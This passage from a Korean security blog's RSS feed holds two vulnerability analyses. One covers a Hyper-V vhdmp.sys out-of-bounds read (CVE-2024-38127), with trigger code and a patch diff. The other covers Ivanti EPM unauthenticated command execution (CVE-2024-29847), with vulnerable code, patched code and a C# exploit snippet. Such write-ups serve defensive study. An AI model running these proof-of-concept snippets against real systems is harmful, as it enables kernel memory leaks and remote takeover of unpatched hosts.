&#xC0DD;&#xC131;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">DWORD status = <span class="hljs-number">0</span>;PWCHAR VhdxPath = VHDX_PATH;HANDLE Vhdx = <span class="hljs-literal">NULL</span>;GUID uniqueId;UuidCreate(&amp;uniqueId);VIRTUAL_STORAGE_TYPE VStorType = { <span class="hljs-number">0</span>, };CREATE_VIRTUAL_DISK_PARAMETERS CreateParam = {.Version = CREATE_VIRTUAL_DISK_VERSION_2,.Version2 = {.UniqueId = uniqueId,.MaximumSize = <span class="hljs-number">1073741824</span>,<span class="hljs-comment">//1GB</span>.BlockSizeInBytes = <span class="hljs-number">0</span>,.SectorSizeInBytes = <span class="hljs-number">512</span>,.PhysicalSectorSizeInBytes = <span class="hljs-number">512</span>,.ParentPath = <span class="hljs-literal">NULL</span>},};ULONG SizeUsed = <span class="hljs-number">0</span>;VStorType.DeviceId = VIRTUAL_STORAGE_TYPE_DEVICE_UNKNOWN;status = CreateVirtualDisk(&amp;VStorType,VhdxPath,VIRTUAL_DISK_ACCESS_NONE,<span class="hljs-literal">NULL</span>,CREATE_VIRTUAL_DISK_FLAG_FULL_PHYSICAL_ALLOCATION,<span class="hljs-number">0</span>,&amp;CreateParam,<span class="hljs-literal">NULL</span>,&amp;Vhdx);</code></pre><p>&#xC774;&#xD6C4; &#xC5BB;&#xC5B4;&#xC9C4; HANDLE&#xC744; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; DeviceIoControl&#xC744; &#xD638;&#xCD9C;&#xD574;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">DWORD InBuffer = <span class="hljs-number">5</span>;status = DeviceIoControl(Vhdx,<span class="hljs-number">0x2d1940</span>,&amp;InBuffer,<span class="hljs-number">4</span>,OutBuffer,<span class="hljs-number">0x20</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>);</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; <code>DeviceIoControl</code>&#xC758; <code>nOutBufferSize</code> &#xC778;&#xC790;&#xB85C; 0x20&#xC744; &#xC0AC;&#xC6A9;&#xD588;&#xC9C0;&#xB9CC; &#xC2E4;&#xC81C; &#xC4F0;&#xC774;&#xB294; &#xB370;&#xC774;&#xD130;&#xB294; &#xADF8; &#xC774;&#xC0C1;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCDA9;&#xBD84;&#xD788; &#xD070; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD574;&#xC904; &#xD544;&#xC694;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. DeviceIoControl &#xD638;&#xCD9C;&#xC740; &#xC2E4;&#xD328;&#xD558;&#xC9C0;&#xB9CC; &#xB370;&#xC774;&#xD130;&#xB294; &#xC81C;&#xB300;&#xB85C; &#xBCF5;&#xC0AC;&#xAC00; &#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; OOB Read&#xB41C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; Non paged pool &#xBA54;&#xBAA8;&#xB9AC;&#xC758; &#xD0DC;&#xADF8;&#xB098; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB85C; &#xBCF4;&#xC774;&#xB294; &#xAC12;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/09/15/pwndorei/hyperv-1dayclass_CVE-2024-38127/image.png" alt="image.png"></p><p>&#xC704; &#xC2A4;&#xD06C;&#xB9B0;&#xC0F7;&#xC740; &#xCEE4;&#xB110; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xD1B5;&#xD574; &#xC2DC;&#xC2A4;&#xD15C;&#xBC84;&#xD37C;&#xC640; &#xC778;&#xC811;&#xD55C; non paged pool &#xBA54;&#xBAA8;&#xB9AC;&#xC758; &#xB370;&#xC774;&#xD130;&#xC640; poc &#xC2E4;&#xD589; &#xD6C4; OOB Read&#xB41C; &#xB370;&#xC774;&#xD130;&#xAC00; &#xAC19;&#xC74C;&#xC744; &#xBCF4;&#xC774;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h1><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xD328;&#xCE58;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="VhdmpiQueryMetaData-vhdmp-sys-10-0-22621-4036"><a href="#VhdmpiQueryMetaData-vhdmp-sys-10-0-22621-4036" class="headerlink" title="VhdmpiQueryMetaData (vhdmp.sys 10.0.22621.4036)"></a><code>VhdmpiQueryMetaData</code> (vhdmp.sys 10.0.22621.4036)</h2><pre><code class="hljs c">          <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:            v19 = *(<span class="hljs-keyword">unsigned</span> __int16 *)(v5 + <span class="hljs-number">88</span>);            *(_DWORD *)SystemBuffer = <span class="hljs-number">5</span>;LABEL_17:            <span class="hljs-keyword">if</span> ( OutputBufferLength &gt;= (<span class="hljs-keyword">int</span>)v19 + <span class="hljs-number">0x22</span> )            {              *(_BYTE *)(SystemBuffer + <span class="hljs-number">8</span>) = <span class="hljs-number">1</span>;              *(_DWORD *)(SystemBuffer + <span class="hljs-number">12</span>) = v19 + <span class="hljs-number">2</span>;              memmove((<span class="hljs-keyword">void</span> *)(SystemBuffer + <span class="hljs-number">16</span>), *(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> **)(v5 + <span class="hljs-number">96</span>), v19);              *(_WORD *)(SystemBuffer + <span class="hljs-number">16</span> + <span class="hljs-number">2</span> * (v19 &gt;&gt; <span class="hljs-number">1</span>)) = <span class="hljs-number">0</span>;            }            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)Feature_797274427__private_IsEnabledDeviceUsage() )<span class="hljs-comment">//[1]</span>            {              *(_DWORD *)(SystemBuffer + <span class="hljs-number">12</span>) = v19 + <span class="hljs-number">2</span>;LABEL_22:              *v7 = v12;<span class="hljs-comment">//[2]</span>              v17 = <span class="hljs-number">0</span>;              <span class="hljs-keyword">goto</span> LABEL_89;            }            v12 = v19 + <span class="hljs-number">34</span>;</code></pre><p>&#xAE30;&#xC874;&#xACFC; &#xB2EC;&#xB9AC; [1]&#xC5D0; else if&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xC5B4; OutputBuffer&#xC758; &#xD06C;&#xAE30;&#xAC00; &#xBD80;&#xC871;&#xD558;&#xB2E4;&#xBA74; [2]&#xC5D0;&#xC11C; Output&#xC758; &#xD06C;&#xAE30;&#xB97C; 0&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xBA74;&#xC11C; OOB Read&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h1><iframe width="560" height="315" src="https://www.youtube.com/embed/dj6xTMZgB-8?si=0Irm_wB0RIlHE5vp" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/hyper-v/">hyper-v</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/diffing/">diffing</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2024-38127/">CVE-2024-38127</category>
      
      <category domain="https://hackyboiz.github.io/tags/Hyper-V-1-day-Class/">Hyper-V 1-day Class</category>
      
      
      <comments>https://hackyboiz.github.io/2024/09/15/pwndorei/hyperv-1dayclass_CVE-2024-38127/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-29847 : Ivanti Endpoint Manager (EPM)의 데이터 검증 미흡으로 인한 Unauthenticated Command Execution 취약점</title>
      <link>https://hackyboiz.github.io/2024/09/14/j0ker/2024-09-14/</link>
      <guid>https://hackyboiz.github.io/2024/09/14/j0ker/2024-09-14/</guid>
      <pubDate>Sat, 14 Sep 2024 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.horizon3.ai/attack-research/attack-blog</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://www.horizon3.ai/attack-research/attack-blogs/cve-2024-29847-deep-dive-ivanti-endpoint-manager-agentportal-deserialization-of-untrusted-data-remote-code-execution-vulnerability/">CVE-2024-29847 Deep Dive: Ivanti Endpoint Manager AgentPortal Deserialization of Untrusted Data Remote Code Execution Vulnerability</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ivanti EPM before 2022 SU6</li><li>Ivanti EPM the 2024 September update</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>AgentPortal.exe&#xC5D0;&#xB294; .Net Remoting&#xC744; &#xAD6C;&#xD604;&#xD558;&#xAE30; &#xC704;&#xD55C; IAngentProtal &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xAC00; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. IAgentPortal&#xC5D0; RunProgram &#xC635;&#xC158;&#xC744; &#xD655;&#xC778;&#xD574; &#xBCF4;&#xBA74; &#xC6D0;&#xACA9;&#xC5D0;&#xC11C; &#xC804;&#xB2EC;&#xB41C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xADF8;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">ProcessRunProgramAction</span>(<span class="hljs-params">TaskData td, TaskData tdRef, <span class="hljs-keyword">string</span>[] data</span>)</span><span class="hljs-function"></span>{<span class="hljs-keyword">bool</span> flag = <span class="hljs-literal">true</span>;<span class="hljs-keyword">int</span> index = <span class="hljs-number">0</span>;<span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">string</span> command <span class="hljs-keyword">in</span> td._commands){<span class="hljs-keyword">try</span> {Process process = <span class="hljs-keyword">new</span> Process();process.StartInfo.UseShellExecute = <span class="hljs-literal">false</span>;process.StartInfo.RedirextStadardOutput = <span class="hljs-literal">true</span>;process.StartInfo.FileName = td._target;process.StartInfo.Arguments = command; <span class="hljs-comment">// [1]</span>process.Start(); <span class="hljs-comment">// [2]</span></code></pre><p>&#xC704; &#xCF54;&#xB4DC; [1]&#xC5D0;&#xC11C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xAC00;&#xC838;&#xC640; [2]&#xC5D0;&#xC11C; &#xADF8;&#xB300;&#xB85C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; command&#xC5D0; &#xB300;&#xD574; &#xC544;&#xBB34;&#xB7F0;&#xAC80;&#xC99D;&#xC744; &#xD558;&#xC9C0; &#xC54A;&#xC544; &#xC784;&#xC758;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">ProcessRunProgramAction</span>(<span class="hljs-params">TaskData td, TaskData tdRef, <span class="hljs-keyword">string</span>[] data</span>)</span><span class="hljs-function"></span>{<span class="hljs-keyword">bool</span> flag = <span class="hljs-literal">true</span>;<span class="hljs-keyword">int</span> index = <span class="hljs-number">0</span>;<span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">string</span> command <span class="hljs-keyword">in</span> td._commands){<span class="hljs-keyword">try</span> {Process process = <span class="hljs-keyword">new</span> Process();process.StartInfo.UseShellExecute = <span class="hljs-literal">false</span>;process.StartInfo.RedirextStadardOutput = <span class="hljs-literal">true</span>;<span class="hljs-keyword">if</span> (td._target != <span class="hljs-string">&quot;ping.exe&quot;</span> &amp;&amp; td._target != <span class="hljs-string">&quot;tracert.exe&quot;</span>)<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;process.StartInfo.FileName = td._target;process.StartInfo.Arguments = command;process.Start();</code></pre><p>&#xD328;&#xCE58;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74; &#xC704;&#xC640; &#xAC19;&#xC774; ping&#xC774;&#xB098; tracert&#xAC00; &#xC544;&#xB2C8;&#xBA74; &#xC2E4;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs csharp"><span class="hljs-keyword">var</span> ip = args[<span class="hljs-number">0</span>];<span class="hljs-keyword">var</span> port = args[<span class="hljs-number">1</span>];<span class="hljs-keyword">var</span> command = args[<span class="hljs-number">2</span>];<span class="hljs-keyword">string</span> arguments = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">if</span> (args.Length &gt; <span class="hljs-number">3</span>){   arguments = <span class="hljs-keyword">string</span>.Join(<span class="hljs-string">&quot; &quot;</span>, args, <span class="hljs-number">3</span>, args.Length - <span class="hljs-number">3</span>);}<span class="hljs-keyword">string</span> url = String.Format(<span class="hljs-string">&quot;tcp://{0}:{1}/LANDeskAgentPortal/LDSM&quot;</span>, ip, port);IAgentPortal agentPortal = (IAgentPortal)Activator.GetObject(<span class="hljs-keyword">typeof</span>(IAgentPortal), url);<span class="hljs-keyword">try</span>{    Console.WriteLine(<span class="hljs-string">&quot;Sending request.&quot;</span>);    <span class="hljs-keyword">bool</span> request_result = agentPortal.Request(<span class="hljs-string">&quot;localhost&quot;</span>, IAgentPortalBase.ActionEnum.RunProgram, command,  arguments);</code></pre><p>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xAC04;&#xB2E8;&#xD55C; &#xB9CC;&#xD07C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xB3C4; &#xAC04;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;. &#xB2E8;&#xC21C;&#xD558;&#xAC8C; &#xC2E4;&#xD589;&#xD560; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xB123;&#xC5B4; Agetnportal&#xC5D0; &#xC804;&#xC1A1;&#xD558;&#xBA74; &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD65C;&#xC6A9;&#xD558;&#xAE30; &#xC27D;&#xACE0; &#xC778;&#xC99D;&#xC744; &#xAC70;&#xCE58;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; CVSS3.1 9.8&#xC810;&#xC744; &#xBC1B;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/horizon3ai/CVE-2024-29847">horizon3ai/CVE-2024-29847</a></li><li><a href="https://www.zerodayinitiative.com/advisories/ZDI-24-1223/">Ivanti Endpoint Manager AgentPortal Deserialization of Untrusted Data Remote Code Execution Vulnerability</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/Ivanti/">Ivanti</category>
      
      <category domain="https://hackyboiz.github.io/tags/Endpoint-Manager/">Endpoint Manager</category>
      
      <category domain="https://hackyboiz.github.io/tags/EPM/">EPM</category>
      
      <category domain="https://hackyboiz.github.io/tags/AgentPortal/">AgentPortal</category>
      
      <category domain="https://hackyboiz.github.io/tags/Deserialization/">Deserialization</category>
      
      <category domain="https://hackyboiz.github.io/tags/Command-Execution/">Command Execution</category>
      
      <category domain="https://hackyboiz.github.io/tags/Remote-Code-Execution/">Remote Code Execution</category>
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      
      <comments>https://hackyboiz.github.io/2024/09/14/j0ker/2024-09-14/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
